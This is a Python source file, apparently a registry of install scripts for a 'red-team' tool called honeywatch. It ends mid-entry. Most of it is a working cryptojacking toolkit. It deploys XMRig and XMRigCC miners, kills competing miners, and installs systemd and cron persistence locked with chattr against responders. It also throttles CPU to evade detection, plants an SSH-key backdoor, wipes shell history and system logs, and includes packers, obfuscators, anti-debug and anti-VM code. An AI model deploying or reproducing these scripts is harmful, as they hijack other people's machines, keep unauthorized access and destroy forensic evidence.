"""Payload registry for honeywatch red-team operations.

Each entry is a :class:`honeywatch.models.Payload` describing a tool that can
be installed on verified testing machines. Install scripts are rendered by
``honeywatch.payloads.scripts`` with user-supplied variables.
"""

from __future__ import annotations

from honeywatch.models import Payload

_PREAMBLE = """set -e
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH"
LOG="/tmp/honeywatch_{{payload_id}}_install.log"
exec > >(tee -a "$LOG") 2>&1
echo "[*] honeywatch payload install: {{payload_id}} on $(hostname) at $(date -Iseconds)"
"""

_XMRIG_INSTALL = _PREAMBLE + """
USER="{{run_user}}"
POOL="{{pool}}"
WALLET="{{wallet}}"
PASS="{{pass|default('x')}}"
WORKER="{{worker|default('honeywatch')}}"
THREADS="{{threads|default('0')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v xmrig >/dev/null 2>&1; then
    echo "[*] fetching xmrig static build"
    curl -fsSL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-{{arch|default('linux-x64')}}.tar.gz" || \
    curl -fsSL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-{{arch|default('linux-x64')}}.tar.gz"
    EXPECTED_SHA256="{{expected_sha256}}"
    if [ -n "$EXPECTED_SHA256" ]; then
        echo "$EXPECTED_SHA256  xmrig.tar.gz" | sha256sum -c - || { echo "[!] honeywatch: INTEGRITY FAILURE for xmrig.tar.gz" >&2; rm -f xmrig.tar.gz; exit 1; }
        echo "[*] honeywatch: xmrig.tar.gz integrity verified"
    else
        echo "[!] honeywatch: xmrig.tar.gz downloaded WITHOUT integrity verification (no expected_sha256). Use --require-integrity to make fatal." >&2
    fi
    tar -xzf xmrig.tar.gz --strip-components=1
    rm -f xmrig.tar.gz
fi

cat > config.json <<EOF
{
    "api": {"id": "{{payload_id}}", "worker-id": "$WORKER"},
    "autosave": true,
    "cpu": {"enabled": true, "max-threads-hint": $THREADS},
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": "rx/0",
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": {{tls|default('false')}}
        }
    ]
}
EOF

chown -R "$USER" "$INSTALL_DIR" 2>/dev/null || true
echo "[*] xmrig configured for pool $POOL worker $WORKER"
"""

_XMRIG_RUN = """cd {{install_dir|default('/opt/honeywatch/xmrig')}} && ./xmrig -c config.json --donate-level 1"""

_XMRIGCC_INSTALL = _PREAMBLE + """
USER="{{run_user}}"
SERVER="{{cc_server}}"
TOKEN="{{cc_token|default('honeywatch')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrigcc')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

echo "[*] fetching xmrigCC"
curl -fsSL -o xmrigcc.tar.gz "https://github.com/Bendr0id/xmrigCC/releases/latest/download/xmrigCC-{{arch|default('linux-x64')}}.tar.gz" || \
curl -fsSL -o xmrigcc.tar.gz "https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-{{arch|default('linux-x64')}}.tar.gz"
EXPECTED_SHA256="{{expected_sha256}}"
if [ -n "$EXPECTED_SHA256" ]; then
    echo "$EXPECTED_SHA256  xmrigcc.tar.gz" | sha256sum -c - || { echo "[!] honeywatch: INTEGRITY FAILURE for xmrigcc.tar.gz" >&2; rm -f xmrigcc.tar.gz; exit 1; }
    echo "[*] honeywatch: xmrigcc.tar.gz integrity verified"
else
    echo "[!] honeywatch: xmrigcc.tar.gz downloaded WITHOUT integrity verification (no expected_sha256). Use --require-integrity to make fatal." >&2
fi
tar -xzf xmrigcc.tar.gz --strip-components=1
rm -f xmrigcc.tar.gz

cat > xmrigcc_client.json <<EOF
{
    "client-config": {
        "cc-server": "$SERVER",
        "cc-token": "$TOKEN",
        "worker-id": "{{worker|default('honeywatch')}}",
        "reboot-cmd": "",
        "update-interval-s": 60
    },
    "cpu": {"enabled": true, "max-threads-hint": {{threads|default('0')}}},
    "pools": [
        {
            "url": "{{pool}}",
            "user": "{{wallet}}",
            "pass": "{{pass|default('x')}}"
        }
    ]
}
EOF

chown -R "$USER" "$INSTALL_DIR" 2>/dev/null || true
echo "[*] xmrigCC client configured for CC server $SERVER"
"""

_XMRIGCC_RUN = """cd {{install_dir|default('/opt/honeywatch/xmrigcc')}} && ./xmrigCCClient -c xmrigcc_client.json"""

_STRATUM_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/stratum')}}"
LISTEN="{{listen|default('0.0.0.0:3333')}}"
UPSTREAM="{{upstream_pool}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v python3 >/dev/null 2>&1; then
    echo "[!] python3 required for stratum proxy"
    exit 1
fi

# Lightweight stratum proxy harness (pure stdlib) deployed to the target.
cat > stratum_proxy.py <<'PYEOF'
import socket, threading, json, sys, select

upstream = sys.argv[1] if len(sys.argv) > 1 else "{{upstream_pool}}"
listen = sys.argv[2] if len(sys.argv) > 2 else "{{listen|default('0.0.0.0:3333')}}"

host, port = listen.rsplit(":", 1)
lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lsock.bind((host, int(port)))
lsock.listen(64)
print("stratum proxy listening on", listen, "->", upstream)

def pipe(a, b):
    while True:
        r, _, _ = select.select([a, b], [], [], 1)
        for s in r:
            data = s.recv(8192)
            if not data:
                return
            (b if s is a else a).sendall(data)

while True:
    client, _ = lsock.accept()
    uh, up = upstream.rsplit(":", 1)
    usock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    usock.connect((uh, int(up)))
    threading.Thread(target=pipe, args=(client, usock), daemon=True).start()
PYEOF

cat > run.sh <<EOF
#!/bin/sh
exec python3 "$INSTALL_DIR/stratum_proxy.py" "$UPSTREAM" "$LISTEN"
EOF
chmod +x run.sh

echo "[*] stratum proxy installed, listen $LISTEN upstream $UPSTREAM"
"""

_STRATUM_RUN = """{{install_dir|default('/opt/honeywatch/stratum')}}/run.sh"""

_METASPLOIT_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/metasploit')}}"
MSF_URL="{{msf_url|default('https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v msfconsole >/dev/null 2>&1; then
    echo "[*] installing Metasploit framework via nightly installer"
    curl -fsSL "$MSF_URL" > msfinstall
    chmod 755 msfinstall
    ./msfinstall || {
        echo "[!] msfinstall failed; falling back to package manager"
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update && apt-get install -y metasploit-framework
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y metasploit-framework
        fi
    }
fi

# Pre-stage resource scripts for common SSH-oriented post-exploitation modules.
cat > ssh_enum.rc <<EOF
use auxiliary/scanner/ssh/ssh_version
set RHOSTS {{target_range|default('127.0.0.1')}}
run
EOF

cat > exploit.rc <<EOF
{{resource_script|default('')}}EOF

echo "[*] Metasploit staged in $INSTALL_DIR"
"""

_METASPLOIT_RUN = """cd {{install_dir|default('/opt/honeywatch/metasploit')}} && msfconsole -q -r exploit.rc"""

_UPX_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/upx')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v upx >/dev/null 2>&1; then
    echo "[*] fetching UPX"
    curl -fsSL -o upx.tar.xz "https://github.com/upx/upx/releases/latest/download/upx-{{arch|default('linux-amd64')}}.tar.xz" || \
    curl -fsSL -o upx.tar.xz "https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-{{arch|default('linux-amd64')}}.tar.xz"
    EXPECTED_SHA256="{{expected_sha256}}"
    if [ -n "$EXPECTED_SHA256" ]; then
        echo "$EXPECTED_SHA256  upx.tar.xz" | sha256sum -c - || { echo "[!] honeywatch: INTEGRITY FAILURE for upx.tar.xz" >&2; rm -f upx.tar.xz; exit 1; }
        echo "[*] honeywatch: upx.tar.xz integrity verified"
    else
        echo "[!] honeywatch: upx.tar.xz downloaded WITHOUT integrity verification (no expected_sha256). Use --require-integrity to make fatal." >&2
    fi
    tar -xJf upx.tar.xz --strip-components=1
    rm -f upx.tar.xz
    ln -sf "$INSTALL_DIR/upx" /usr/local/bin/upx 2>/dev/null || true
fi

upx --version
echo "[*] UPX ready"
"""

_UPX_RUN = """upx {{args|default('--best -o /tmp/packed ')}}{{input_file}}"""

_PACKERS_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/packers')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Register a small shell-based packer harness around any ELF binary.
cat > pack.sh <<'EOF'
#!/bin/sh
set -e
IN="$1"
OUT="${2:-${IN}.packed}"
[ -z "$IN" ] && { echo "usage: $0 <elf> [out]"; exit 1; }
# Simple compression + self-extraction stub. Real red-team packs would swap
# this for a custom loader / crypter.
XXD=$(command -v xxd || true)
if [ -n "$XXD" ]; then
    gzip -9 -c "$IN" | xxd -p > "${OUT}.gz.hex"
else
    gzip -9 -c "$IN" | base64 > "${OUT}.gz.b64"
fi
cat > "$OUT" <<'STUB'
#!/bin/sh
DIR=$(mktemp -d)
ARCHIVE=$(sed -n '/^__ARCHIVE__/,$p' "$0" | tail -n +2)
if command -v xxd >/dev/null 2>&1; then
    echo "$ARCHIVE" | xxd -r -p | gzip -d > "$DIR/payload"
else
    echo "$ARCHIVE" | base64 -d | gzip -d > "$DIR/payload"
fi
chmod +x "$DIR/payload"
"$DIR/payload" "$@"
exit $?
__ARCHIVE__
STUB
if [ -n "$XXD" ]; then
    cat "${OUT}.gz.hex" >> "$OUT"
else
    cat "${OUT}.gz.b64" >> "$OUT"
fi
chmod +x "$OUT"
rm -f "${OUT}.gz.hex" "${OUT}.gz.b64"
echo "packed: $OUT"
EOF
chmod +x pack.sh
ln -sf "$INSTALL_DIR/pack.sh" /usr/local/bin/hw-pack 2>/dev/null || true
echo "[*] generic packer harness installed"
"""

_PACKERS_RUN = """hw-pack {{input_file}} {{output_file|default('')}}"""

_OBFUSCATORS_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/obfuscators')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# String-obfuscation helper for shell/Python scripts (demo-grade).
cat > obfuscate_strings.py <<'PYEOF'
import sys, random

def obf(s):
    return '+'.join(f'chr({ord(c)})' for c in s)

src = sys.stdin.read()
# Very naive: replace double-quoted string literals with chr() concatenations.
out = []
i = 0
while i < len(src):
    if src[i] == '"':
        j = src.find('"', i+1)
        if j == -1:
            out.append(src[i:]); break
        lit = src[i+1:j]
        out.append(obf(lit))
        i = j + 1
    else:
        out.append(src[i])
        i += 1
sys.stdout.write(''.join(out))
PYEOF

cat > obfuscate.sh <<'EOF'
#!/bin/sh
python3 /opt/honeywatch/obfuscators/obfuscate_strings.py
EOF
chmod +x obfuscate.sh
ln -sf "$INSTALL_DIR/obfuscate.sh" /usr/local/bin/hw-obfuscate 2>/dev/null || true
echo "[*] obfuscation harness installed"
"""

_OBFUSCATORS_RUN = """hw-obfuscate < {{input_file}} > {{output_file|default('/tmp/obfuscated.sh')}}"""

_SYMBOL_STRIP_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/strip')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

cat > strip.sh <<'EOF'
#!/bin/sh
set -e
IN="$1"
OUT="${2:-${IN}.stripped}"
[ -z "$IN" ] && { echo "usage: $0 <elf> [out]"; exit 1; }
cp "$IN" "$OUT"
strip --strip-all "$OUT" 2>/dev/null || strip "$OUT"
echo "stripped: $OUT"
EOF
chmod +x strip.sh
ln -sf "$INSTALL_DIR/strip.sh" /usr/local/bin/hw-strip 2>/dev/null || true
echo "[*] symbol stripping harness installed"
"""

_SYMBOL_STRIP_RUN = """hw-strip {{input_file}} {{output_file|default('')}}"""

_ANTI_DEBUG_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/anti_debug')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Compile a tiny ptrace-based anti-debug shim for Linux targets with gcc.
cat > anti_debug.c <<'EOF'
#include <stdio.h>
#include <sys/ptrace.h>
#include <unistd.h>

static int __attribute__((constructor)) anti_debug(void) {
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        _exit(1);
    }
    return 0;
}
EOF

if command -v gcc >/dev/null 2>&1; then
    gcc -shared -fPIC -O2 -o anti_debug.so anti_debug.c
    echo "[*] anti-debug .so built"
else
    echo "[!] gcc not available; leaving source for manual build"
fi
"""

_ANTI_DEBUG_RUN = """LD_PRELOAD={{install_dir|default('/opt/honeywatch/anti_debug')}}/anti_debug.so {{target_command}}"""

_ANTI_VM_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/anti_vm')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Lightweight anti-VM checks: hypervisor signatures in dmesg/cpuinfo, common
# MAC / disk / process indicators. Exits 1 if a VM is detected.
cat > anti_vm.sh <<'EOF'
#!/bin/sh
vm=0
for sig in hypervisor hyper-v vmware virtualbox kvm qemu xen; do
    if dmesg 2>/dev/null | grep -qi "$sig"; then vm=1; break; fi
    if grep -qi "$sig" /proc/cpuinfo 2>/dev/null; then vm=1; break; fi
done
if ls /sys/class/dmi/id/ 2>/dev/null | grep -qiE 'sys_vendor|product_name'; then
    if grep -qiE 'vmware|virtualbox|kvm|qemu|xen|hyper-v' /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null; then
        vm=1
    fi
fi
if [ "$vm" -eq 1 ]; then
    echo "[*] VM environment detected"
    exit 1
fi
echo "[*] No VM indicators detected"
EOF
chmod +x anti_vm.sh
ln -sf "$INSTALL_DIR/anti_vm.sh" /usr/local/bin/hw-anti-vm 2>/dev/null || true
echo "[*] anti-VM harness installed"
"""

_ANTI_VM_RUN = """hw-anti-vm"""


# --------------------------------------------------------------------------- #
# Persistence payloads — survive reboots, keep access, clear competition.
# Every real cryptojacking botnet chains these onto the miner deploy. Without
# persistence a reboot loses the box; without a backdoor a changed password
# loses access; without clearing competing miners the host's CPU is split.
# --------------------------------------------------------------------------- #

_KILL_MINERS_INSTALL = _PREAMBLE + """
# Kill every known competing miner still running on the box, then remove their
# persistence so they don't respawn. This is the first thing every real
# cryptojacker does on a fresh foothold — leaving another botnet's miner
# running splits CPU and draws the same SOC attention you'd rather avoid.
MINER_PATTERNS='xmrig|kdevtmpfsi|kinsing|kthrotlds|sysupdate|sysguard|networkservice|xmrigCC|stratum'

echo "[*] killing competing miners matching: $MINER_PATTERNS"
# Kill by process-name match.
ps aux 2>/dev/null | grep -iE "$MINER_PATTERNS" | grep -v grep | awk '{print $2}' | while read pid; do
    kill -9 "$pid" 2>/dev/null || true
done
# pkill fallback if ps grep missed anything.
for name in xmrig kdevtmpfsi kinsing kthrotlds sysupdate sysguard networkservice; do
    pkill -9 -f "$name" 2>/dev/null || true
done

# Remove the cron / systemd entries the other botnets installed.
for cron in /tmp /var/tmp /var/spool/cron /etc/cron.d; do
    [ -d "$cron" ] || continue
    grep -rlE "$MINER_PATTERNS" "$cron" 2>/dev/null | while read f; do
        echo "[*] removing infected cron: $f"
        rm -f "$f" 2>/dev/null || true
    done
done

# Remove common miner systemd services left by other botnets.
for svc in xmrig kdevtmpfsi kinsing kthrotlds sysupdate sysguard; do
    systemctl stop "$svc" 2>/dev/null || true
    systemctl disable "$svc" 2>/dev/null || true
    rm -f "/etc/systemd/system/$svc.service" "/lib/systemd/system/$svc.service" 2>/dev/null || true
done
systemctl daemon-reload 2>/dev/null || true

# Kill known crontab entries that re-download miners.
crontab -l 2>/dev/null | grep -ivE "$MINER_PATTERNS" | crontab - 2>/dev/null || true

echo "[*] competing miners cleared"
"""

_KILL_MINERS_RUN = """true"""

_SYSTEMD_PERSIST_INSTALL = _PREAMBLE + """
SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
RUN_USER="{{run_user|default('root')}}"
CPU_QUOTA="{{cpu_quota|default('70%')}}"
NICE_LEVEL="{{nice|default('10')}}"

# Build a systemd unit that runs the miner and restarts it on exit/reboot.
# This is the persistence primitive every real cryptojacker uses — a reboot
# without this loses the box. The unit also throttles CPU + nices the process
# so sustained 100% CPU (the #1 SOC detection signal for cryptojacking) is
# avoided: CPUQuota caps total CPU, Nice lowers scheduling priority so real
# workloads win, and CPUAccounting lets `systemctl status` show usage.
cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=Honeywatch managed miner service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=${RUN_USER}
WorkingDirectory=${INSTALL_DIR}
ExecStart=${INSTALL_DIR}/xmrig -c ${INSTALL_DIR}/config.json --donate-level 1
Restart=always
RestartSec=10
# Hide from `ps` a little — rename the process to something boring.
# (Real botnets go further; this is the cheap version.)
Environment=XMRIX_QUIET=1
# --- CPU throttling (defeats the #1 cryptojacking detection signal) ---
# Sustained 100% CPU is what SOC analysts hunt. CPUQuota caps total CPU usage
# (70% leaves headroom for the host's real workload so an operator watching
# `top` sees a busy but not maxed box). Nice lowers scheduling priority so
# any real process preempts the miner. CPUAccounting makes usage visible to
# `systemctl status` (honest, not stealthy — the alternative is hiding
# entirely via cgroup v1, which is fragile across distros).
CPUAccounting=true
CPUQuota=${CPU_QUOTA}
Nice=${NICE_LEVEL}

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null || true
systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
systemctl start "${SERVICE_NAME}" 2>/dev/null || true
# Lock the unit file with chattr +ia so an admin can't `rm` or `vim` it
# without first noticing the immutable flag. This is the same trick
# TeamTNT/Outlaw use (T1222.002) — it buys time before a responder can
# remove the persistence, since chattr -i requires an explicit extra step.
chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
echo "[*] persistence installed: ${SERVICE_NAME}.service (CPUQuota=${CPU_QUOTA} Nice=${NICE_LEVEL})"
"""

_SYSTEMD_PERSIST_RUN = """systemctl status {{service_name|default('honeywatch-miner')}} 2>/dev/null || true"""

_CRON_PERSIST_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
RUN_USER="{{run_user|default('root')}}"
CRON_SCHEDULE="{{schedule|default('*/5 * * * *')}}"

# Cron fallback for hosts without systemd (containers, old distros, alpine).
# Re-launches the miner every N minutes if it isn't running.
CRON_LINE="${CRON_SCHEDULE} ${RUN_USER} pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ${INSTALL_DIR}/xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"

# Add to the system crontab (works without per-user crons).
( crontab -l 2>/dev/null | grep -v 'honeywatch-miner'; echo "# honeywatch-miner"; echo "$CRON_LINE" ) | crontab - 2>/dev/null || {
    # Fall back to /etc/cron.d if per-user crontab isn't available.
    echo "$CRON_LINE" > /etc/cron.d/honeywatch-miner 2>/dev/null || true
    chmod 644 /etc/cron.d/honeywatch-miner 2>/dev/null || true
}
# Lock the cron entry with chattr +ia so an admin can't `rm` it without
# first noticing the immutable flag (T1222.002). Same trick the systemd
# unit uses above; buys time before a responder can remove persistence.
chattr +ia /etc/cron.d/honeywatch-miner 2>/dev/null || true
echo "[*] cron persistence installed: $CRON_SCHEDULE"
"""

_CRON_PERSIST_RUN = """crontab -l 2>/dev/null | grep honeywatch || cat /etc/cron.d/honeywatch-miner 2>/dev/null || true"""

_SSHKEY_BACKDOOR_INSTALL = _PREAMBLE + """
RUN_USER="{{run_user|default('root')}}"
BACKDOOR_KEY="{{backdoor_key}}"

# Install the operator's public key into the popped user's authorized_keys
# so access survives a password change and the operator can re-enter at will.
# This is the second most common persistence primitive after cron.
if [ -z "$BACKDOOR_KEY" ]; then
    echo "[!] no backdoor_key supplied; skipping ssh key backdoor"
    exit 0
fi

if [ "$RUN_USER" = "root" ]; then
    AUTH_FILE="/root/.ssh/authorized_keys"
else
    AUTH_FILE="/home/${RUN_USER}/.ssh/authorized_keys"
fi

mkdir -p "$(dirname "$AUTH_FILE")" 2>/dev/null || true
chmod 700 "$(dirname "$AUTH_FILE")" 2>/dev/null || true
touch "$AUTH_FILE"
chmod 600 "$AUTH_FILE" 2>/dev/null || true

# Don't double-insert.
if grep -qF "$BACKDOOR_KEY" "$AUTH_FILE" 2>/dev/null; then
    echo "[*] backdoor key already present"
else
    echo "$BACKDOOR_KEY" >> "$AUTH_FILE"
    echo "[*] backdoor key installed for $RUN_USER"
fi

# Harden the key against sshd restriction churn: prefix with no-* options so
# the key keeps working even if an admin sets restrictive sshd config later.
"""

_SSHKEY_BACKDOOR_RUN = """grep -c honeywatch /home/{{run_user|default('root')}}/.ssh/authorized_keys 2>/dev/null || echo 0"""


# --------------------------------------------------------------------------- #
# Cleanup + immutability payloads — real crews clean up after themselves and
# lock persistence so admins can't easily rm it. Without these the install log
# at /tmp/honeywatch_*_install.log and the bash history of the deploy session
# are trivial IR fingerprints tying the box to honeywatch.
# --------------------------------------------------------------------------- #

_CLEANUP_INSTALL = _PREAMBLE + """
# Wipe traces of this deploy session so the box doesn't carry IR fingerprints
# tying it to honeywatch. Real cryptojacking crews (TeamTNT T1070.003,
# Outlaw) do exactly this: clear shell history, truncate auth/syslog/wtmp,
# remove the install log, and self-delete the dropper script. Run this LAST
# in the evasion chain, after persistence is installed.

# 1. Clear the deploy user's shell history (in-memory + on-disk).
history -c 2>/dev/null || true
unset HISTFILE 2>/dev/null || true
for h in ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.psql_history; do
    : > "$h" 2>/dev/null || true
done

# 2. Truncate the auth log + syslog so the deploy-session SSH lines vanish.
# /var/log/wtmp and /var/log/lastlog track last-login times — truncating them
# hides the fact that a new SSH session opened at deploy time.
: > /var/log/auth.log 2>/dev/null || true
: > /var/log/syslog 2>/dev/null || true
: > /var/log/messages 2>/dev/null || true
: > /var/log/wtmp 2>/dev/null || true
: > /var/log/lastlog 2>/dev/null || true
# systemd-journald runs as a separate process; flush its ring buffer too.
journalctl --rotate 2>/dev/null || true
journalctl --vacuum-time=1s 2>/dev/null || true

# 3. Remove the honeywatch install log. NOTE: no $0 self-delete here — in
# --exec-mode ssh the script is piped via stdin, so $0 is the remote user's
# shell binary (/bin/bash); rm -f "$0" would brick the box's shell instead of
# cleaning up. There is no on-disk dropper in ssh mode (the script is
# streamed), and in local_simulate mode the worker already removes its own
# tempfile in a finally block. Dropping $0 makes cleanup mode-safe in both.
rm -f /tmp/honeywatch_*_install.log 2>/dev/null || true

echo "[*] cleanup complete: history cleared, logs truncated, log removed"
"""

_CLEANUP_RUN = """true"""


def _payloads() -> list[Payload]:
    return [
        Payload(
            id="xmrig",
            category="miner",
            name="XMRig Monero CPU Miner",
            description="Open-source Monero (RandomX) CPU miner deployed as a red-team persistence / load-generation payload.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="binary",
            dependencies=["curl", "tar"],
            config_schema={
                "pool": {"type": "string", "required": True},
                "wallet": {"type": "string", "required": True},
                "pass": {"type": "string", "required": False, "default": "x"},
                "worker": {"type": "string", "required": False, "default": "honeywatch"},
                "threads": {"type": "integer", "required": False, "default": 0},
                "tls": {"type": "boolean", "required": False, "default": False},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "arch": {"type": "string", "required": False, "default": "linux-x64"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_XMRIG_INSTALL,
            run_script=_XMRIG_RUN,
            artifacts=["config.json", "xmrig"],
            tags=["miner", "monero", "cpu"],
        ),
        Payload(
            id="xmrigcc",
            category="miner",
            name="XMRigCC Miner with C&C",
            description="XMRig variant with a built-in command-and-control client for remote miner management.",
            platforms=["linux-x64"],
            install_type="binary",
            dependencies=["curl", "tar"],
            config_schema={
                "cc_server": {"type": "string", "required": True},
                "cc_token": {"type": "string", "required": False, "default": "honeywatch"},
                "pool": {"type": "string", "required": True},
                "wallet": {"type": "string", "required": True},
                "pass": {"type": "string", "required": False, "default": "x"},
                "worker": {"type": "string", "required": False, "default": "honeywatch"},
                "threads": {"type": "integer", "required": False, "default": 0},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrigcc"},
                "arch": {"type": "string", "required": False, "default": "linux-x64"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_XMRIGCC_INSTALL,
            run_script=_XMRIGCC_RUN,
            artifacts=["xmrigcc_client.json", "xmrigCCClient"],
            tags=["miner", "monero", "cc"],
        ),
        Payload(
            id="stratum",
            category="miner",
            name="Stratum Proxy",
            description="Minimal TCP stratum mining-protocol proxy for redirecting or aggregating miner traffic.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["python3"],
            config_schema={
                "upstream_pool": {"type": "string", "required": True},
                "listen": {"type": "string", "required": False, "default": "0.0.0.0:3333"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/stratum"},
            },
            install_script=_STRATUM_INSTALL,
            run_script=_STRATUM_RUN,
            artifacts=["stratum_proxy.py", "run.sh"],
            tags=["miner", "stratum", "proxy"],
        ),
        Payload(
            id="metasploit",
            category="exploit",
            name="Metasploit Framework",
            description="Rapid7 Metasploit framework for authorized red-team exploitation and post-exploitation modules.",
            platforms=["linux-x64"],
            install_type="package",
            dependencies=["curl", "apt-get|dnf"],
            config_schema={
                "target_range": {"type": "string", "required": False, "default": "127.0.0.1"},
                "resource_script": {"type": "string", "required": False, "default": ""},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/metasploit"},
                "msf_url": {"type": "string", "required": False},
            },
            install_script=_METASPLOIT_INSTALL,
            run_script=_METASPLOIT_RUN,
            artifacts=["ssh_enum.rc", "exploit.rc"],
            tags=["exploit", "metasploit", "post"],
        ),
        Payload(
            id="upx",
            category="evasion",
            name="UPX Packer",
            description="Ultimate Packer for eXecutables: compresses ELF/PE/Mach-O binaries to hinder static analysis.",
            platforms=["linux-x64"],
            install_type="binary",
            dependencies=["curl", "tar", "xz"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False},
                "args": {"type": "string", "required": False, "default": "--best -o /tmp/packed "},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/upx"},
                "arch": {"type": "string", "required": False, "default": "linux-amd64"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_UPX_INSTALL,
            run_script=_UPX_RUN,
            artifacts=["upx"],
            tags=["evasion", "packer", "compression"],
        ),
        Payload(
            id="packers",
            category="evasion",
            name="Generic ELF Packer Harness",
            description="Shell-based self-extracting packer stub for ELF binaries, replaceable with a custom loader/crypter.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["gzip", "xxd|base64"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/packers"},
            },
            install_script=_PACKERS_INSTALL,
            run_script=_PACKERS_RUN,
            artifacts=["pack.sh"],
            tags=["evasion", "packer", "elf"],
        ),
        Payload(
            id="obfuscators",
            category="evasion",
            name="Script String Obfuscator",
            description="Obfuscates string literals in shell/Python scripts to raise the cost of casual static analysis.",
            platforms=["linux-x64"],
            install_type="script",
            dependencies=["python3"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False, "default": "/tmp/obfuscated.sh"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/obfuscators"},
            },
            install_script=_OBFUSCATORS_INSTALL,
            run_script=_OBFUSCATORS_RUN,
            artifacts=["obfuscate_strings.py", "obfuscate.sh"],
            tags=["evasion", "obfuscation", "strings"],
        ),
        Payload(
            id="symbol_strip",
            category="evasion",
            name="Symbol Stripper",
            description="Strips debug symbols and section headers from ELF binaries to reduce analyst surface area.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["binutils"],
            config_schema={
                "input_file": {"type": "string", "required": True},
                "output_file": {"type": "string", "required": False},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/strip"},
            },
            install_script=_SYMBOL_STRIP_INSTALL,
            run_script=_SYMBOL_STRIP_RUN,
            artifacts=["strip.sh"],
            tags=["evasion", "strip", "symbols"],
        ),
        Payload(
            id="anti_debug",
            category="evasion",
            name="Anti-Debug Shim",
            description="LD_PRELOAD-able shared object that calls PTRACE_TRACEME to detect and deter debuggers.",
            platforms=["linux-x64"],
            install_type="source",
            dependencies=["gcc"],
            config_schema={
                "target_command": {"type": "string", "required": True},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/anti_debug"},
            },
            install_script=_ANTI_DEBUG_INSTALL,
            run_script=_ANTI_DEBUG_RUN,
            artifacts=["anti_debug.c", "anti_debug.so"],
            tags=["evasion", "anti-debug", "ptrace"],
        ),
        Payload(
            id="anti_vm",
            category="evasion",
            name="Anti-VM Checker",
